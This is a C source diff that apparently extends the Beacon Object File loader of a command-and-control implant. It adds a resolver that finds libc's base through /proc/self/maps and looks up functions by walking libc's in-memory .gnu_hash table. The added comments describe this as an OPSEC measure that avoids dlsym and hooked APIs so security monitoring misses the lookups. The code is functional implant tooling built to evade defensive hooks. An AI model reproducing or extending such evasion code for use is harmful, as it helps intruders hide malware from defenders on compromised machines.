@@ -713,17 +713,204 @@ static bof_api_entry_t bof_api_table[] = {
     {NULL, NULL}
 };
 
+
+/* ── Runtime symbol resolver — resolves LIBC$/RTLD$ prefixed symbols ─────
+ * without dlsym. Parses /proc/self/maps to find libc base, then walks
+ * the ELF .gnu_hash table in-memory to resolve by hash.
+ *
+ * OPSEC: No dlsym call, no string comparison in the search loop (hash only).
+ * The requested function name exists briefly in the BOF's .rodata but never
+ * passes through any hooked API. */
+
+/* DJB2 hash — same algorithm used to query .gnu_hash */
+static unsigned int _djb2(const char *s) {
+    unsigned int h = 5381;
+    while (*s) h = h * 33 + (unsigned char)*s++;
+    return h;
+}
+
+/* Find libc base address from /proc/self/maps.
+ * We look for the FIRST mapping of libc with file offset 00000000 — that's
+ * the ELF base where headers start. The r-xp mapping has a non-zero offset
+ * and would produce a wrong base. */
+static void *_find_libc_base(void) {
+    static void *cached_base = NULL;
+    if (cached_base) return cached_base;
+
+    int fd = open("/proc/self/maps", O_RDONLY);
+    if (fd < 0) return NULL;
+
+    /* Read in chunks — /proc/self/maps can exceed 4KB for complex processes */
+    char buf[256]; /* line buffer */
+    char line[512];
+    int line_len = 0;
+    int n;
+
+    while ((n = (int)read(fd, buf, sizeof(buf))) > 0) {
+        for (int i = 0; i < n; i++) {
+            if (buf[i] == '\n' || line_len >= (int)sizeof(line) - 1) {
+                line[line_len] = '\0';
+
+                /* Match: contains "libc" AND has file offset 00000000 */
+                if ((strstr(line, "libc.so") || strstr(line, "libc-")) &&
+                    strstr(line, " 00000000 ")) {
+                    /* Parse base address: "7f1234560000-..." */
+                    unsigned long addr = 0;
+                    char *p = line;
+                    while (*p && *p != '-') {
+                        unsigned int digit;
+                        if (*p >= '0' && *p <= '9') digit = *p - '0';
+                        else if (*p >= 'a' && *p <= 'f') digit = *p - 'a' + 10;
+                        else break;
+                        addr = (addr << 4) | digit;
+                        p++;
+                    }
+                    close(fd);
+                    cached_base = (void *)addr;
+                    return cached_base;
+                }
+                line_len = 0;
+            } else {
+                line[line_len++] = buf[i];
+            }
+        }
+    }
+    close(fd);
+    return NULL;
+}
+
+/* Resolve a symbol from libc's in-memory ELF structures using .gnu_hash */
+static void *_resolve_from_libc(const char *name) {
+    unsigned char *base = (unsigned char *)_find_libc_base();
+    if (!base) return NULL;
+
+    /* Validate ELF magic */
+    if (base[0] != 0x7f || base[1] != 'E' || base[2] != 'L' || base[3] != 'F')
+        return NULL;
+
+    typedef struct { unsigned char e_ident[16]; uint16_t e_type, e_machine;
+        uint32_t e_version; uint64_t e_entry, e_phoff, e_shoff;
+        uint32_t e_flags; uint16_t e_ehsize, e_phentsize, e_phnum;
+        uint16_t e_shentsize, e_shnum, e_shstrndx; } Ehdr64;
+
+    typedef struct { uint32_t p_type, p_flags; uint64_t p_offset, p_vaddr,
+        p_paddr, p_filesz, p_memsz, p_align; } Phdr64;
+
+    typedef struct { uint64_t d_tag; union { uint64_t d_val; uint64_t d_ptr; } d_un; } Dyn64;
+
+    typedef struct { uint32_t st_name; unsigned char st_info, st_other;
+        uint16_t st_shndx; uint64_t st_value, st_size; } Sym64;
+
+    Ehdr64 *eh = (Ehdr64 *)base;
+    Phdr64 *phdrs = (Phdr64 *)(base + eh->e_phoff);
+
+    /* Find PT_DYNAMIC */
+    Dyn64 *dyn = NULL;
+    for (int i = 0; i < eh->e_phnum; i++) {
+        if (phdrs[i].p_type == 2 /* PT_DYNAMIC */) {
+            /* p_vaddr for in-memory access (already mapped), not p_offset (file) */
+            dyn = (Dyn64 *)(base + phdrs[i].p_vaddr);
+            break;
+        }
+    }
+    if (!dyn) return NULL;
+
+    /* Extract .dynsym, .dynstr, .gnu_hash from PT_DYNAMIC.
+     * On modern glibc (2.32+) these are ABSOLUTE virtual addresses.
+     * On older systems they may be offsets from base. Detect by checking
+     * if the pointer falls within a reasonable range of base. */
+    uint64_t raw_symtab = 0, raw_strtab = 0, raw_gnu_hash = 0;
+
+    for (Dyn64 *d = dyn; d->d_tag != 0; d++) {
+        switch (d->d_tag) {
+        case 6:  /* DT_SYMTAB */   raw_symtab   = d->d_un.d_ptr; break;
+        case 5:  /* DT_STRTAB */   raw_strtab   = d->d_un.d_ptr; break;
+        case 0x6ffffef5: /* DT_GNU_HASH */ raw_gnu_hash = d->d_un.d_ptr; break;
+        }
+    }
+    if (!raw_symtab || !raw_strtab || !raw_gnu_hash) return NULL;
+
+    /* If d_ptr is already > base, it's absolute. Otherwise add base. */
+    uint64_t b = (uint64_t)base;
+    Sym64      *symtab   = (Sym64 *)(raw_symtab   >= b ? raw_symtab   : b + raw_symtab);
+    const char *strtab   = (const char *)(raw_strtab >= b ? raw_strtab : b + raw_strtab);
+    uint32_t   *gnu_hash = (uint32_t *)(raw_gnu_hash >= b ? raw_gnu_hash : b + raw_gnu_hash);
+    if (!symtab || !strtab || !gnu_hash) return NULL;
+
+    /* GNU hash lookup */
+    uint32_t nbuckets    = gnu_hash[0];
+    uint32_t symoffset   = gnu_hash[1];
+    uint32_t bloom_size  = gnu_hash[2];
+    uint32_t bloom_shift = gnu_hash[3];
+    uint64_t *bloom      = (uint64_t *)(gnu_hash + 4);
+    uint32_t *buckets    = (uint32_t *)(bloom + bloom_size);
+    uint32_t *chain      = buckets + nbuckets;
+
+    uint32_t h = _djb2(name);
+
+    /* Bloom filter check */
+    uint64_t word = bloom[(h / 64) % bloom_size];
+    uint64_t mask = (1ULL << (h % 64)) | (1ULL << ((h >> bloom_shift) % 64));
+    if ((word & mask) != mask) return NULL;
+
+    /* Bucket lookup */
+    uint32_t idx = buckets[h % nbuckets];
+    if (!idx) return NULL;
+
+    /* Chain walk — compare hashes, verify with strcmp only on match */
+    for (;; idx++) {
+        uint32_t hh = chain[idx - symoffset];
+        if ((hh | 1) == (h | 1)) {
+            Sym64 *sym = &symtab[idx];
+            if (sym->st_value && strcmp(strtab + sym->st_name, name) == 0) {
+                /* st_value: if < base it's an offset, otherwise absolute */
+                uint64_t sv = (uint64_t)sym->st_value;
+                return (void *)(sv >= b ? sv : b + sv);
+            }
+        }
+        if (hh & 1) break; /* end of chain */
+    }
+    return NULL;
+}
+
 /* Forward declaration — implemented in nax_bof_sdk.c */
 void *nax_bof_resolve_custom(const char *name);
 
 void *bof_resolve_symbol(const char *name) {
     if (!name) return NULL;
-    /* Search custom (agent-registered) symbols first */
+
+    /* Layer 1: Custom symbols registered by the agent via nax_bof_register_symbol() */
     void *custom = nax_bof_resolve_custom(name);
     if (custom) return custom;
-    /* Fall back to base SDK table */
+
+    /* Layer 2: Base SDK table (Beacon* and Ax* APIs) */
     for (int i = 0; bof_api_table[i].name; i++)
         if (strcmp(name, bof_api_table[i].name) == 0)
             return bof_api_table[i].func;
+
+    /* Layer 3: Runtime resolution from host libc via in-memory ELF parsing.
+     * Activated by LIBC$ or RTLD$ prefix in the BOF symbol name.
+     *
+     *   extern void *LIBC$opendir(const char *);
+     *   extern int   LIBC$closedir(void *);
+     *
+     * No dlsym, no -ldl dependency. Parses libc's .gnu_hash directly in RAM.
+     *
+     * OPSEC: The function name appears only in the BOF's .rodata and briefly
+     * on the stack during hash comparison. No hooked API is called. */
+    const char *real_name = NULL;
+    if (strncmp(name, "LIBC$", 5) == 0)
+        real_name = name + 5;
+    else if (strncmp(name, "RTLD$", 5) == 0)
+        real_name = name + 5;
+
+    if (real_name) {
+        void *addr = _resolve_from_libc(real_name);
+        if (!addr)
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!] Runtime resolve failed: '%s' not found in host libc\n", real_name);
+        return addr;
+    }
+
     return NULL;
 }
